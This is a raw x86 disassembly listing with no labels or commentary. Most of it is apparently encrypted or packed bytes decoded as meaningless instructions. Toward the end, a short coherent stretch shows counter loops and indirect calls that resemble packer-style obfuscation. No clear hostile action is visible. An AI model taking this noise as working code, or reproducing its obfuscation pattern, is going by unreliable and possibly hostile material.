  418953:	xor    dl,BYTE PTR [ecx+0x6a405b3b]
  418959:	ja     0x418951
  41895b:	rcr    edi,1
  41895d:	jg     0x418933
  41895f:	aaa    
  418960:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418961:	loop   0x4188f3
  418963:	pusha  
  418964:	dec    ecx
  418965:	xlat   BYTE PTR ds:[ebx]
  418966:	es lods eax,DWORD PTR fs:[esi]
  418969:	popa   
  41896a:	mov    esp,0x226bf180
  41896f:	ins    BYTE PTR es:[edi],dx
  418970:	mov    esp,0x24aed8cf
  418975:	pop    edi
  418976:	sbb    al,0x6e
  418978:	jmp    0x4bc5f65a
  41897d:	shr    BYTE PTR [ecx+0x6956e1a3],0x16
  418984:	pop    eax
  418985:	outs   dx,BYTE PTR ds:[esi]
  418986:	ret    
  418987:	ror    cl,1
  418989:	sahf   
  41898a:	mov    bh,0xd
  41898c:	and    BYTE PTR [edi],cl
  41898e:	(bad)  [ebx]
  418990:	jnp    0x418924
  418992:	mov    dh,0x6b
  418994:	add    dl,al
  418996:	add    al,0xa7
  418998:	mov    ds:0xa11ced08,al
  41899d:	(bad)  
  41899e:	xchg   edx,eax
  41899f:	mov    dl,0x59
  4189a1:	inc    esi
  4189a2:	jbe    0x4189ce
  4189a4:	mov    ebx,0x3808d262
  4189a9:	jp     0x41896f
  4189ab:	inc    ebp
  4189ac:	out    dx,al
  4189ad:	(bad)  
  4189ae:	xlat   BYTE PTR ds:[ebx]
  4189af:	test   eax,0xa2f43dd0
  4189b4:	fwait
  4189b5:	sbb    ebx,DWORD PTR [esi]
  4189b7:	fst    DWORD PTR [edx-0xc91b648]
  4189bd:	xor    ch,BYTE PTR [ecx-0x4503486b]
  4189c3:	scas   eax,DWORD PTR es:[edi]
  4189c4:	imul   eax,DWORD PTR [ebx-0x57],0xd797c5de
  4189cb:	icebp  
  4189cc:	aaa    
  4189cd:	adc    bh,dl
  4189cf:	and    eax,esp
  4189d1:	cmc    
  4189d2:	lahf   
  4189d3:	xchg   ecx,eax
  4189d4:	cmp    BYTE PTR [ebx],0x1f
  4189d7:	out    0x86,al
  4189d9:	mov    eax,ds:0xd878b8ce
  4189de:	add    ch,BYTE PTR [eax-0xd]
  4189e1:	or     ebp,DWORD PTR [eax-0x5a]
  4189e4:	fcmovnu st,st(1)
  4189e6:	jae    0x4189ea
  4189e8:	lods   al,BYTE PTR ds:[esi]
  4189e9:	sub    eax,0x59809b61
  4189ee:	mov    ds:0xeb91f202,eax
  4189f3:	es mov ch,0x8e
  4189f6:	inc    ecx
  4189f7:	mov    DWORD PTR [esi+0x726e8227],ebx
  4189fd:	pop    esi
  4189fe:	fild   WORD PTR [esi]
  418a00:	pop    ecx
  418a01:	sahf   
  418a02:	shl    BYTE PTR [esi+0x75],1
  418a05:	popa   
  418a06:	out    0x12,al
  418a08:	or     DWORD PTR [eax+0x5cc4ef14],ecx
  418a0e:	pushf  
  418a0f:	mov    ebx,0xc7a4a410
  418a14:	in     eax,dx
  418a15:	shr    BYTE PTR [edx-0x40],cl
  418a18:	push   cs
  418a19:	inc    ecx
  418a1a:	cmp    BYTE PTR [esi-0x1ed12c84],dh
  418a20:	xchg   DWORD PTR [ecx+0x40],esi
  418a23:	(bad)  [ebx-0x28]
  418a26:	push   ss
  418a27:	add    al,0x19
  418a29:	dec    esi
  418a2a:	cmp    eax,0x1810bd5e
  418a2f:	fdiv   st(3),st
  418a31:	mov    edx,0x9af3d416
  418a36:	sub    ebx,DWORD PTR [eax-0x3b654154]
  418a3c:	mov    dl,0x32
  418a3e:	enter  0x87a,0x71
  418a42:	cdq    
  418a43:	rol    BYTE PTR [edi],cl
  418a45:	or     esi,edi
  418a47:	jle    0x418a65
  418a49:	cmp    al,BYTE PTR [ebp-0x7074b7ab]
  418a4f:	pop    edx
  418a50:	inc    ecx
  418a51:	fisub  DWORD PTR [edx+ebx*2]
  418a54:	dec    esi
  418a55:	fwait
  418a56:	add    al,0x16
  418a58:	das    
  418a59:	mov    edx,ebx
  418a5b:	jmp    0xdbbe123d
  418a60:	int    0xd5
  418a62:	pop    ecx
  418a63:	ins    BYTE PTR es:[edi],dx
  418a64:	mov    fs,WORD PTR [ebx-0x3d402d0e]
  418a6a:	adc    DWORD PTR [edx+0x51],esp
  418a6d:	add    ebx,DWORD PTR [ebp+0x1e]
  418a70:	jmp    0x62f91e1d
  418a75:	cs dec ecx
  418a77:	jecxz  0x418a0c
  418a79:	fs inc eax
  418a7b:	pop    eax
  418a7c:	ret    0x48bd
  418a7f:	jno    0x418aaf
  418a81:	inc    eax
  418a82:	sub    eax,0xb552bb7b
  418a87:	sub    eax,0xffa49303
  418a8c:	sbb    eax,0x8078f772
  418a91:	xchg   edi,eax
  418a92:	leave  
  418a93:	cmp    al,0xf
  418a95:	pusha  
  418a96:	je     0x418aee
  418a98:	jo     0x418aed
  418a9a:	mov    ebp,0x2269779
  418a9f:	in     eax,dx
  418aa0:	scas   al,BYTE PTR es:[edi]
  418aa1:	pop    es
  418aa2:	pop    edx
  418aa3:	add    ah,BYTE PTR [ecx+eiz*8]
  418aa6:	adc    al,0xb9
  418aa8:	icebp  
  418aa9:	test   al,0x56
  418aab:	call   0x17471b15
  418ab0:	mov    ebp,DWORD PTR [eax]
  418ab2:	in     al,dx
  418ab3:	sbb    eax,0x12bcd0c7
  418ab8:	cs dec ebp
  418aba:	or     cl,BYTE PTR [ebx-0x53e6658a]
  418ac0:	xchg   edi,eax
  418ac1:	das    
  418ac2:	mov    edx,0x325229be
  418ac7:	or     esi,DWORD PTR [ebx-0x4c4fe64c]
  418acd:	imul   BYTE PTR [edx]
  418acf:	fisubr DWORD PTR [edi+0x19e75374]
  418ad5:	js     0x418a82
  418ad7:	push   0xffffffbf
  418ad9:	out    dx,eax
  418ada:	cwde   
  418adb:	adc    al,0xbc
  418add:	ffreep st(5)
  418adf:	in     eax,0xd8
  418ae1:	adc    al,0x8d
  418ae3:	stos   BYTE PTR es:[edi],al
  418ae4:	loope  0x418b39
  418ae6:	jb     0x418a99
  418ae8:	jl     0x418a98
  418aea:	clc    
  418aeb:	mov    ah,0xeb
  418aed:	lock shl BYTE PTR [edi+0x73],0x69
  418af2:	add    al,0xd8
  418af4:	in     al,0xde
  418af6:	pop    edi
  418af7:	lock call 0x912470a3
  418afd:	les    ebx,FWORD PTR [edx-0x19b8eb08]
  418b03:	int3   
  418b04:	lods   al,BYTE PTR ds:[esi]
  418b05:	inc    esi
  418b06:	mov    edx,0x81aec96e
  418b0b:	jae    0x418aa7
  418b0d:	scas   eax,DWORD PTR es:[edi]
  418b0e:	outs   dx,DWORD PTR ds:[esi]
  418b0f:	test   al,0x4e
  418b11:	(bad)  
  418b12:	jae    0x418b61
  418b14:	daa    
  418b15:	and    BYTE PTR es:[ebx+0x3e],0x57
  418b1a:	dec    esp
  418b1b:	int    0xf7
  418b1d:	fwait
  418b1e:	loopne 0x418b7d
  418b20:	dec    esp
  418b21:	xlat   BYTE PTR ds:[ebx]
  418b22:	retf   0x7982
  418b25:	imul   ecx,DWORD PTR [edi+0x73],0xfa41f9b5
  418b2c:	js     0x418b91
  418b2e:	popf   
  418b2f:	mov    ds,WORD PTR [esi]
  418b31:	in     al,dx
  418b32:	stc    
  418b33:	push   esp
  418b34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b35:	inc    esp
  418b36:	cdq    
  418b37:	push   0x744facf9
  418b3c:	add    al,0xd0
  418b3e:	pop    ecx
  418b3f:	jb     0x418ae1
  418b41:	mov    DWORD PTR [esi+0x68],edi
  418b44:	dec    edi
  418b45:	push   0xfffffff4
  418b47:	add    eax,0x9b916dd9
  418b4c:	inc    edx
  418b4d:	inc    ebx
  418b4e:	sbb    DWORD PTR [ecx],0x73
  418b51:	jp     0x418afe
  418b53:	jmp    0x3820b89e
  418b58:	push   0x18
  418b5a:	dec    ebx
  418b5b:	loope  0x418b83
  418b5d:	push   es
  418b5e:	ins    DWORD PTR es:[edi],dx
  418b5f:	daa    
  418b60:	mov    ch,BYTE PTR [edi+ebx*2-0x7d]
  418b64:	jge    0x418b26
  418b66:	lods   eax,DWORD PTR ds:[esi]
  418b67:	test   ch,bl
  418b69:	or     BYTE PTR [edi-0x4f],dl
  418b6c:	sahf   
  418b6d:	pop    esi
  418b6e:	push   esp
  418b6f:	les    esi,FWORD PTR [ebp-0x5e]
  418b72:	rcr    BYTE PTR [ecx],0x1d
  418b75:	cli    
  418b76:	jmp    0x8619615
  418b7b:	lock mov ds:0x45921c9f,eax
  418b81:	inc    esp
  418b82:	div    BYTE PTR [edi+0xcb636d2]
  418b88:	mov    ch,0x7d
  418b8a:	add    ebp,DWORD PTR [eax+ebp*8]
  418b8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b8e:	mov    dl,0x81
  418b90:	mov    ch,0x61
  418b92:	push   0x78acef9f
  418b97:	mov    edi,DWORD PTR [ecx]
  418b99:	mov    ah,0x0
  418b9b:	xchg   edx,eax
  418b9c:	jmp    0x28b7f3ce
  418ba1:	pop    ss
  418ba2:	aaa    
  418ba3:	stos   DWORD PTR es:[edi],eax
  418ba4:	(bad)  
  418ba5:	xchg   ebp,eax
  418ba6:	jne    0x418be5
  418ba8:	ins    DWORD PTR es:[edi],dx
  418ba9:	(bad)  
  418baa:	mov    BYTE PTR [eax+0x56727b0],ah
  418bb0:	push   esp
  418bb1:	jns    0x418b46
  418bb3:	or     bh,dh
  418bb5:	sti    
  418bb6:	bound  edi,QWORD PTR [edi+0x3e]
  418bb9:	sahf   
  418bba:	fsubr  QWORD PTR [esp+ebp*1]
  418bbd:	or     bh,ch
  418bbf:	xor    eax,0x99e0952a
  418bc4:	cld    
  418bc5:	mov    esi,0xa33084a5
  418bca:	dec    ebp
  418bcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418bcc:	out    dx,eax
  418bcd:	sar    ebx,0x6b
  418bd0:	jle    0x418bbd
  418bd2:	mov    ebx,eax
  418bd4:	ss dec eax
  418bd6:	sub    bl,BYTE PTR [esi+0x2a]
  418bd9:	sbb    al,0x3c
  418bdb:	adc    eax,DWORD PTR [ecx+edx*4-0x73]
  418bdf:	div    DWORD PTR [eax+0x7181117c]
  418be5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418be6:	inc    esp
  418be7:	xchg   ebp,eax
  418be8:	aaa    
  418be9:	mov    bl,0xa5
  418beb:	inc    edx
  418bec:	jae    0x418c3a
  418bee:	and    BYTE PTR [edx+0x5b94e103],ch
  418bf4:	pushf  
  418bf5:	(bad)
  418bf9:	dec    edi
  418bfa:	loopne 0x418c4c
  418bfc:	add    cl,bl
  418bfe:	out    dx,al
  418bff:	push   es
  418c00:	mov    DWORD PTR [ecx-0x76],ebx
  418c03:	fs into 
  418c05:	fsubp  st(4),st
  418c07:	add    al,0x61
  418c09:	pop    es
  418c0a:	inc    esi
  418c0b:	lds    ebx,FWORD PTR [ecx-0x640562f1]
  418c11:	not    esi
  418c13:	call   0x2b19:0x6aa383d
  418c1a:	mov    WORD PTR [edi],ds
  418c1c:	mov    ch,0x7f
  418c1e:	mov    DWORD PTR [eax+0x7bd4def6],edi
  418c24:	xchg   BYTE PTR [eax-0x62],dl
  418c27:	add    eax,0xe7c26b0c
  418c2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c2d:	adc    al,0x59
  418c2f:	ja     0x418bdc
  418c31:	push   ebp
  418c32:	and    cl,cl
  418c34:	push   esp
  418c35:	or     ebp,DWORD PTR [edi+0x901dde2]
  418c3b:	pushf  
  418c3c:	pop    ss
  418c3d:	xchg   edx,eax
  418c3e:	mov    esp,0x719a4491
  418c43:	sti    
  418c44:	lds    ebx,FWORD PTR [esi-0x38]
  418c47:	mov    bh,BYTE PTR ds:0xc0d60f6
  418c4d:	dec    esi
  418c4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c4f:	in     al,dx
  418c50:	xchg   edi,eax
  418c51:	fld    DWORD PTR [edi-0x2ecf4157]
  418c57:	lea    eax,[ecx]
  418c59:	inc    eax
  418c5a:	call   0x6188:0xe4c41e4b
  418c61:	jmp    0x534edab1
  418c66:	xor    al,0x83
  418c68:	test   BYTE PTR [eax],ah
  418c6a:	push   ds
  418c6b:	mov    edi,0xc2bfa2d2
  418c70:	push   ebx
  418c71:	(bad)  
  418c72:	(bad)  
  418c73:	scas   eax,DWORD PTR es:[edi]
  418c74:	in     al,dx
  418c75:	add    eax,0xdb1d9c1a
  418c7a:	dec    eax
  418c7b:	fs jmp 0xee85:0x93a0d958
  418c83:	jle    0x418c93
  418c85:	lods   al,BYTE PTR ds:[esi]
  418c86:	jne    0x418c9d
  418c88:	je     0x418c1c
  418c8a:	fdivr  st,st(2)
  418c8c:	jcxz   0x418c8c
  418c8f:	lods   eax,DWORD PTR ds:[esi]
  418c90:	aas    
  418c91:	lods   eax,DWORD PTR ds:[esi]
  418c92:	mov    al,bl
  418c94:	jns    0x418c7f
  418c96:	adc    BYTE PTR [esi+ebp*2],al
  418c99:	dec    edi
  418c9a:	loopne 0x418d14
  418c9c:	ds daa 
  418c9e:	mov    ecx,0xb782f1d7
  418ca3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ca4:	cmp    DWORD PTR [ecx],0xcf5b7b53
  418caa:	in     al,0x68
  418cac:	ds out dx,al
  418cae:	xchg   BYTE PTR [ebx+0x6],cl
  418cb1:	dec    edi
  418cb2:	sub    al,0xe2
  418cb4:	xchg   DWORD PTR [esi],ebx
  418cb6:	mov    edi,0xb2003b9d
  418cbb:	jp     0x418c80
  418cbd:	push   0x9248db6d
  418cc2:	inc    esi
  418cc3:	es inc eax
  418cc5:	(bad)  
  418cc6:	es pushf 
  418cc8:	test   DWORD PTR [edi+0x9],eax
  418ccb:	pop    edx
  418ccc:	jecxz  0x418d3e
  418cce:	fsubp  st(7),st
  418cd0:	xor    ecx,ebp
  418cd2:	daa    
  418cd3:	cmp    eax,DWORD PTR [ebp*4-0x4921bccc]
  418cda:	imul   esi,DWORD PTR [ecx],0x561309c0
  418ce0:	xchg   esi,eax
  418ce1:	lods   eax,DWORD PTR ds:[esi]
  418ce2:	call   0x357:0x1c144598
  418ce9:	sti    
  418cea:	mov    ecx,0xdac549e2
  418cef:	xchg   esi,eax
  418cf0:	xor    al,0xfd
  418cf2:	xchg   dh,dl
  418cf4:	mov    eax,ds:0x4c2e2a07
  418cf9:	(bad)  
  418cfa:	int3   
  418cfb:	xchg   ebp,eax
  418cfc:	das    
  418cfd:	aad    0x75
  418cff:	jae    0x418ce8
  418d01:	mov    ds:0xda4453d0,eax
  418d06:	lds    esp,FWORD PTR [ecx]
  418d08:	imul   ebx,DWORD PTR [ecx-0x23778611],0x6627a43b
  418d12:	cmp    DWORD PTR [eax],edi
  418d14:	(bad)  
  418d15:	hlt    
  418d16:	pop    ebp
  418d17:	or     BYTE PTR [ecx-0x18],0x0
  418d1b:	loope  0x418d79
  418d1d:	cli    
  418d1e:	cmp    ebp,DWORD PTR [esi-0x48]
  418d21:	push   esp
  418d22:	mov    al,0xdf
  418d24:	dec    ebx
  418d25:	ins    DWORD PTR es:[edi],dx
  418d26:	js     0x418ce1
  418d28:	pop    esp
  418d29:	jne    0x418d28
  418d2b:	in     al,0x6a
  418d2d:	add    ch,cl
  418d2f:	sbb    bh,BYTE PTR [eax-0x73]
  418d32:	push   ebx
  418d33:	inc    edx
  418d34:	ss gs ss clc 
  418d38:	nop
  418d39:	pushf  
  418d3a:	dec    edx
  418d3b:	or     BYTE PTR [eax+eiz*1],al
  418d3e:	and    ch,al
  418d40:	not    DWORD PTR [esi-0x3b]
  418d43:	mov    edi,0x5806675e
  418d48:	stos   DWORD PTR es:[edi],eax
  418d49:	in     eax,dx
  418d4a:	lea    ebp,[esp+edi*8]
  418d4d:	popf   
  418d4e:	sub    eax,0xe3591dde
  418d53:	sub    al,0xf
  418d55:	push   esp
  418d56:	sub    esi,esi
  418d58:	push   0xffffff82
  418d5a:	and    eax,0xdc6cf8b8
  418d5f:	mov    ds:0xe4f85b40,eax
  418d64:	ja     0x418dba
  418d66:	retw   0x4437
  418d6a:	add    al,0x76
  418d6c:	adc    eax,0x75c11af6
  418d71:	mov    eax,edx
  418d73:	call   0x4fde27a3
  418d78:	ins    BYTE PTR es:[edi],dx
  418d79:	in     eax,0xdf
  418d7b:	aam    0xea
  418d7d:	push   esi
  418d7e:	add    DWORD PTR [edx],0xb0775e05
  418d84:	add    al,0xec
  418d86:	dec    esi
  418d87:	shl    edi,1
  418d89:	dec    eax
  418d8a:	imul   eax,DWORD PTR [edi-0x1d],0x32e2f0dc
  418d91:	cmp    BYTE PTR [ebx-0x239c9bc9],ah
  418d97:	fild   WORD PTR [edx-0x3335fea7]
  418d9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d9e:	inc    ebx
  418d9f:	jns    0x418d27
  418da1:	xchg   BYTE PTR [esi+0x18ab4aa7],bh
  418da7:	mov    esp,ebx
  418da9:	ficom  DWORD PTR [ebx+0x13b3adf7]
  418daf:	call   0x9bcf5e6c
  418db4:	cwde   
  418db5:	mov    dh,0xc0
  418db7:	xor    DWORD PTR [ebx],0x33bab336
  418dbd:	in     al,dx
  418dbe:	jns    0x418dfa
  418dc0:	cmp    DWORD PTR [ecx],ecx
  418dc2:	cwde   
  418dc3:	jno    0x418e1a
  418dc5:	outs   dx,BYTE PTR ds:[esi]
  418dc6:	dec    edx
  418dc7:	hlt    
  418dc8:	mov    al,0xc3
  418dca:	mov    ch,BYTE PTR [esi-0x64]
  418dcd:	jl     0x418d75
  418dcf:	sahf   
  418dd0:	imul   esp,DWORD PTR [eax+0x54c018da],0xe48d9001
  418dda:	call   0x5668:0x9873783d
  418de1:	fistp  WORD PTR ds:0x8beb5ce8
  418de7:	xchg   esp,eax
  418de8:	int    0x53
  418dea:	dec    edi
  418deb:	scas   eax,DWORD PTR es:[edi]
  418dec:	gs mov esi,0x4417fbbf
  418df2:	sbb    ah,ch
  418df4:	dec    ebx
  418df5:	outs   dx,DWORD PTR ds:[esi]
  418df6:	mov    esi,0x92a48499
  418dfb:	stos   DWORD PTR es:[edi],eax
  418dfc:	jne    0x418e52
  418dfe:	fcom   DWORD PTR [ebx]
  418e00:	es push esi
  418e02:	push   edi
  418e03:	js     0x418dee
  418e05:	div    DWORD PTR [ebx-0x6e]
  418e08:	sub    ebp,eax
  418e0a:	push   ebx
  418e0b:	addr16 jno 0x418e0a
  418e0e:	nop
  418e0f:	pop    ecx
  418e10:	test   eax,0x7b263db6
  418e15:	int    0x1f
  418e17:	and    al,0xe3
  418e19:	xor    eax,eax
  418e1b:	cmp    ebp,edi
  418e1d:	out    dx,al
  418e1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e1f:	adc    eax,0xdc0ee70
  418e24:	shl    bl,cl
  418e26:	popa   
  418e27:	data16 mov cl,0x19
  418e2a:	int3   
  418e2b:	jge    0x418e32
  418e2d:	cmp    al,0xa7
  418e2f:	sub    al,dl
  418e31:	call   0xcbf04a95
  418e36:	neg    DWORD PTR [ebx+0x2b05959b]
  418e3c:	test   BYTE PTR [ecx+0x19dd152b],al
  418e42:	arpl   WORD PTR [ebp-0x5e],sp
  418e45:	sbb    eax,DWORD PTR [esi-0x462f5948]
  418e4b:	rcl    BYTE PTR [esi-0x75],cl
  418e4e:	int    0x91
  418e50:	out    0xdd,al
  418e52:	push   cs
  418e53:	mov    ecx,esp
  418e55:	and    al,0xd6
  418e57:	lods   al,BYTE PTR ds:[esi]
  418e58:	jo     0x418df4
  418e5a:	push   eax
  418e5b:	dec    edx
  418e5c:	cwde   
  418e5d:	cdq    
  418e5e:	cs or  bh,ch
  418e61:	mov    WORD PTR [esi+0x4522e4c1],ss
  418e67:	and    DWORD PTR [eax+edi*4],ebx
  418e6a:	jb     0x418e81
  418e6c:	xchg   edi,eax
  418e6d:	std    
  418e6e:	aad    0xca
  418e70:	cmp    edi,edi
  418e72:	jmp    0x418e2c
  418e74:	dec    ebp
  418e75:	mov    ecx,0x6bb3dfc0
  418e7a:	inc    eax
  418e7b:	sbb    eax,DWORD PTR [ecx]
  418e7d:	dec    esp
  418e7e:	add    eax,0xe125f9bb
  418e83:	dec    edi
  418e84:	fist   WORD PTR [eax+0x5c]
  418e87:	xchg   edi,eax
  418e88:	dec    edx
  418e89:	push   ebx
  418e8a:	ror    DWORD PTR [edi+0x37514eec],cl
  418e90:	mov    esp,0xeab4536
  418e95:	fisub  DWORD PTR ds:0xe359d29d
  418e9b:	jo     0x418e5d
  418e9d:	lea    esp,[ebp+0x2b04cf40]
  418ea3:	xchg   BYTE PTR [esi+0x64f75485],bl
  418ea9:	dec    eax
  418eaa:	or     BYTE PTR [ebx+ecx*2],dl
  418ead:	sub    dl,dl
  418eaf:	ret    0x6242
  418eb2:	scas   eax,DWORD PTR es:[edi]
  418eb3:	inc    esp
  418eb4:	mov    dh,al
  418eb6:	xor    al,0x58
  418eb8:	inc    ebx
  418eb9:	leave  
  418eba:	(bad)  
  418ebc:	mov    eax,ds:0xf0c8fb7c
  418ec1:	int    0x36
  418ec3:	or     DWORD PTR [ebp+0x75518922],eax
  418ec9:	adc    al,0x0
  418ecb:	loop   0x418ee1
  418ecd:	retf   
  418ece:	mov    ch,0x64
  418ed0:	push   esp
  418ed1:	in     al,dx
  418ed2:	lea    esi,[edi+ebx*1+0x39]
  418ed6:	jge    0x418f4e
  418ed8:	push   eax
  418ed9:	adc    DWORD PTR [esi+0x7a],0xebe159bd
  418ee0:	into   
  418ee1:	xor    BYTE PTR [esi-0x6e67c3a9],0x1a
  418ee8:	push   ss
  418ee9:	or     ebx,DWORD PTR [edx+0x2b]
  418eec:	mov    ebx,0x446595b4
  418ef1:	mov    edi,DWORD PTR [ebp+edi*2+0x32]
  418ef5:	mov    ecx,DWORD PTR [ebp+0x2a]
  418ef8:	push   esi
  418ef9:	int3   
  418efa:	xor    edx,DWORD PTR [edx]
  418efc:	jno    0x418efc
  418efe:	cmp    BYTE PTR [edx+esi*1+0x31],dh
  418f02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f03:	cli    
  418f04:	bound  esi,QWORD PTR [eax-0x18]
  418f07:	ins    DWORD PTR es:[edi],dx
  418f08:	mov    esi,0x41bf01a1
  418f0d:	xchg   BYTE PTR [esi],al
  418f0f:	ins    BYTE PTR es:[edi],dx
  418f10:	mov    eax,0x44731960
  418f15:	std    
  418f16:	data16 loopne 0x418f90
  418f19:	sbb    bl,BYTE PTR [edx-0x7db5df8e]
  418f1f:	ja     0x418efb
  418f21:	in     al,dx
  418f22:	in     eax,0x8d
  418f24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f25:	pushf  
  418f26:	out    dx,al
  418f27:	mov    eax,0x9c0a495b
  418f2c:	pop    ecx
  418f2d:	sahf   
  418f2e:	or     BYTE PTR [edx],bh
  418f30:	ror    DWORD PTR [eax],0x85
  418f33:	push   0xffffff80
  418f35:	cmp    dl,BYTE PTR [ebp+0x4f]
  418f38:	in     al,dx
  418f39:	push   es
  418f3a:	ins    BYTE PTR es:[edi],dx
  418f3b:	cwde   
  418f3c:	repz inc ecx
  418f3e:	iret   
  418f3f:	retf   
  418f40:	mov    al,cl
  418f42:	loopne 0x418ecb
  418f44:	leave  
  418f45:	add    ebx,DWORD PTR [esi+0x7f061eb2]
  418f4b:	fsub   DWORD PTR [ebp+esi*4+0x509a32be]
  418f52:	ss add eax,edx
  418f55:	inc    edx
  418f56:	out    0x86,eax
  418f58:	mov    dl,0xac
  418f5a:	fsub   QWORD PTR [edi+0x15]
  418f5d:	adc    al,0xcd
  418f5f:	pop    ss
  418f60:	and    DWORD PTR [edx-0x4],edx
  418f63:	xor    dh,ah
  418f65:	mov    edi,0x9f471edc
  418f6a:	shl    cl,0x19
  418f6d:	cmp    DWORD PTR [esi],0x2
  418f70:	jle    0x418fb3
  418f72:	(bad)
  418f76:	sub    al,0x6
  418f78:	add    bl,dl
  418f7a:	add    esi,DWORD PTR [edx+0x6d]
  418f7d:	sti    
  418f7e:	adc    BYTE PTR [edi+edx*2-0x1c444da8],0x28
  418f86:	and    dh,bh
  418f88:	mov    ebp,0x73d620c9
  418f8d:	or     bl,dl
  418f8f:	xor    dl,BYTE PTR [ebx-0x40dc8c4a]
  418f95:	pusha  
  418f96:	xor    eax,0xd4c4ce29
  418f9b:	mov    BYTE PTR [eax],al
  418f9d:	adc    al,0x17
  418f9f:	xor    BYTE PTR [eax-0x7d42093a],0xf2
  418fa6:	or     esp,DWORD PTR [eax]
  418fa8:	retf   
  418fa9:	je     0x418f9d
  418fab:	sbb    al,0x72
  418fad:	or     eax,0xfa13862e
  418fb2:	push   esi
  418fb3:	adc    esp,DWORD PTR [esi]
  418fb5:	stc    
  418fb6:	stc    
  418fb7:	rcl    esi,1
  418fb9:	neg    DWORD PTR [eax-0x19c72025]
  418fbf:	mov    ah,0x10
  418fc1:	jmp    0x8df3c1a1
  418fc6:	cmp    BYTE PTR [ecx+0x4d27e10c],dl
  418fcc:	xor    DWORD PTR [edi],edi
  418fce:	xchg   edi,eax
  418fcf:	scas   eax,DWORD PTR es:[edi]
  418fd0:	(bad)  
  418fd1:	mov    edx,0x4ccab973
  418fd6:	sti    
  418fd7:	pop    edi
  418fd8:	arpl   WORD PTR [ecx],sp
  418fda:	mov    ecx,0x442841a3
  418fdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418fe0:	or     al,0xad
  418fe2:	inc    edi
  418fe3:	mov    ds:0xba3115ac,eax
  418fe8:	sub    BYTE PTR [edx],cl
  418fea:	clc    
  418feb:	icebp  
  418fec:	mov    eax,0xde2af313
  418ff1:	fwait
  418ff2:	cmp    al,0xc3
  418ff4:	xchg   esp,eax
  418ff5:	popf   
  418ff6:	repnz rol BYTE PTR ds:0xca816327,0xa3
  418ffe:	xchg   esp,eax
  418fff:	mov    al,ds:0x4b2d48d5
  419004:	pop    ds
  419005:	loope  0x419057
  419007:	(bad)
  41900a:	or     al,BYTE PTR [ebp-0x2f540c6c]
  419010:	xor    BYTE PTR [edi+0x5f916aa1],cl
  419016:	call   0x84a73196
  41901b:	mov    edx,0x3272db
  419020:	add    DWORD PTR ds:0x42a008,0x5e50
  41902a:	add    edi,edx
  41902c:	mov    DWORD PTR ds:0x42a000,0x7626
  419036:	cmp    DWORD PTR [eax],edi
  419038:	je     0x419045
  41903e:	mov    eax,DWORD PTR [eax]
  419040:	jmp    0x41b79b
  419045:	mov    eax,DWORD PTR [ebp+0x18]
  419048:	mov    DWORD PTR ds:0x42b004,0x29bc
  419052:	cmp    eax,esi
  419054:	jne    0x41906e
  41905a:	push   0xf89c85b5
  41905f:	mov    DWORD PTR ds:0x42a018,0x6618
  419069:	jmp    0x41b78a
  41906e:	mov    esi,DWORD PTR [ebp+0x18]
  419071:	mov    eax,0xf89c85b4
  419076:	mov    DWORD PTR ds:0x42a010,0x8ff
  419080:	cmp    esi,eax
  419082:	mov    DWORD PTR ds:0x42d010,0x7cdb
  41908c:	jne    0x41b77a
  419092:	mov    eax,DWORD PTR [ebp+0x10]
  419095:	xor    esi,esi
  419097:	add    esi,DWORD PTR ds:0x423e3a
  41909d:	mov    esi,DWORD PTR [esi]
  41909f:	and    DWORD PTR ds:0x42a010,esi
  4190a5:	xor    eax,ecx
  4190a7:	mov    DWORD PTR ds:0x42c01c,0x15
  4190b1:	cmp    DWORD PTR ds:0x42c01c,0x0
  4190b8:	je     0x419106
  4190be:	cmp    DWORD PTR ds:0x42c01c,0x7
  4190c5:	jne    0x4190d4
  4190cb:	push   DWORD PTR [ebp-0xc]
  4190ce:	call   DWORD PTR ds:0x425030
  4190d4:	cmp    DWORD PTR ds:0x42c01c,0x8
  4190db:	jne    0x4190ee
  4190e1:	mov    esi,DWORD PTR ds:0x42c01c
  4190e7:	dec    esi
  4190e8:	mov    DWORD PTR ds:0x42c01c,esi
  4190ee:	mov    esi,DWORD PTR ds:0x42c01c
  4190f4:	dec    esi
  4190f5:	mov    DWORD PTR ds:0x42c01c,esi
  4190fb:	jmp    0x4190b1
  419100:	neg    DWORD PTR ds:0x42b00c
  419106:	add    eax,edx
  419108:	and    DWORD PTR ds:0x42b004,0x0
  419112:	mov    esi,DWORD PTR ds:0x42b004
  419118:	inc    esi
  419119:	mov    DWORD PTR ds:0x42b004,esi
  41911f:	cmp    DWORD PTR ds:0x42b004,0x4
  419126:	jne    0x41913c
  41912c:	push   0x6d2e
  419131:	push   0x438c
  419136:	call   DWORD PTR ds:0x425034
  41913c:	cmp    DWORD PTR ds:0x42b004,0x3
  419143:	jne    0x419156
  419149:	mov    esi,DWORD PTR ds:0x42b004
  41914f:	inc    esi
  419150:	mov    DWORD PTR ds:0x42b004,esi
  419156:	cmp    DWORD PTR ds:0x42b004,0x10
  41915d:	jb     0x419112
  419163:	mov    DWORD PTR [ebp-0x18],eax
  419166:	and    DWORD PTR ds:0x42d014,0x0
  419170:	mov    eax,ds:0x42d014
  419175:	inc    eax
  419176:	mov    ds:0x42d014,eax
  41917b:	cmp    DWORD PTR ds:0x42d014,0x1a
  419182:	jne    0x41919d
  419188:	push   0x42454e
  41918d:	push   0x424514
  419192:	push   0x87a6
  419197:	call   DWORD PTR ds:0x42503c
  41919d:	cmp    DWORD PTR ds:0x42d014,0x15
  4191a4:	jb     0x419170
  4191aa:	inc    esi
  4191ab:	mov    eax,DWORD PTR [ebp+0xc]
  4191ae:	mov    DWORD PTR ds:0x42c000,0x10
  4191b8:	cmp    DWORD PTR ds:0x42c000,0x0
  4191bf:	je     0x419213
